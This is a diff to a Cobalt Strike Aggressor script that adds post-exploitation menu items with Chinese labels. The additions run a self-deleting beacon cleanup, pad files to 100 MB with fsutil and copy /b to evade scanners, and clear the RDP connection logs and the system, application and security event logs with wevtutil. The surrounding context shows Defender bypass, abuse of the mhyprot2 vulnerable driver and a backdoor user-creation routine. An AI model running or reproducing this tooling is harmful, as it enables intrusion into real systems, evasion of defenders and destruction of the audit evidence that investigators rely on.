@@ -7,7 +7,13 @@ sub DefenderBypass{
 sub MhyProtect{
     bupload($bid,script_resource("bin/mhyprot2.Sys"));
     bexecute_assembly($bid, script_resource("bin/MhyProt2Drv.exe"), "$3['pid']");
+    brm($bid,"mhyprot2.Sys");
 
+}
+sub AutoDeleteMe{
+    bupload($bid,script_resource("bin/AutoDeleteMe.bat"));
+    bshell($bid, "AutoDeleteMe.bat $3['path']");
+    bexit($bid)
 }
 sub Send {
         $username = replace(beacon_info($bid,"user"),' \*',"");
@@ -40,6 +46,12 @@ sub Open_rdp{
 sub Adduser{
     bpowershell_import($bid, script_resource("bin/adduser.ps1"));
     bpowerpick($bid, "AddUser "."\"$3['username']\" "."\"$3['password']\"");
+}
+sub BiggerFile{
+    bshell($bid, "fsutil file createnew c:\\windows\\temp\\myfile.tmp 104857600");
+    btask($bid,"copy /b $3['path1'] \+ c:\\windows\\temp\\myfile.tmp $3['path2']")
+    bshell($bid, "copy /b $3['path1'] \+ c:\\windows\\temp\\myfile.tmp $3['path2']");
+    bshell($bid,"del c:\\windows\\temp\\myfile.tmp")
 }
 
 menu "小工具"{
@@ -92,6 +104,34 @@ menu "小工具"{
         drow_text($dialog,"pid","pid:");
         dbutton_action($dialog, "Send");
         dialog_show($dialog);
+    }
+    item "自删除后下线"{
+        $bid = $1;
+        $dialog = dialog("自删除后下线", %(path => "你的Beacon程序路径"), &AutoDeleteMe);
+        dialog_description($dialog, "自删除后下线,确保你输入的文件没有运行两个以上的进程，否则会无法删除");
+        drow_text($dialog,"path","path:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+    }
+    item "增大文件体积"{
+        $bid = $1;
+        $dialog = dialog("增大文件体积", %(path1 => "目标文件路径",path2 => "增大后输出文件路径"), &BiggerFile);
+        dialog_description($dialog, "增大文件体积，使用了fsutil,也许需要UAC？默认增加大小为100Mb");
+        drow_text($dialog,"path1","raw path:");
+        drow_text($dialog,"path2","output path:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+    }
+    item "清理RDP登录记录"{
+        $bid = $1;
+        bshell($bid, "wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
+    }
+    item "清理所有系统日志"{
+        $bid = $1;
+        bshell($bid, "wevtutil cl system");
+        bshell($bid, "wevtutil cl application");
+        bshell($bid, "wevtutil cl security");
+        bshell($bid, "wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
     }
 
 }
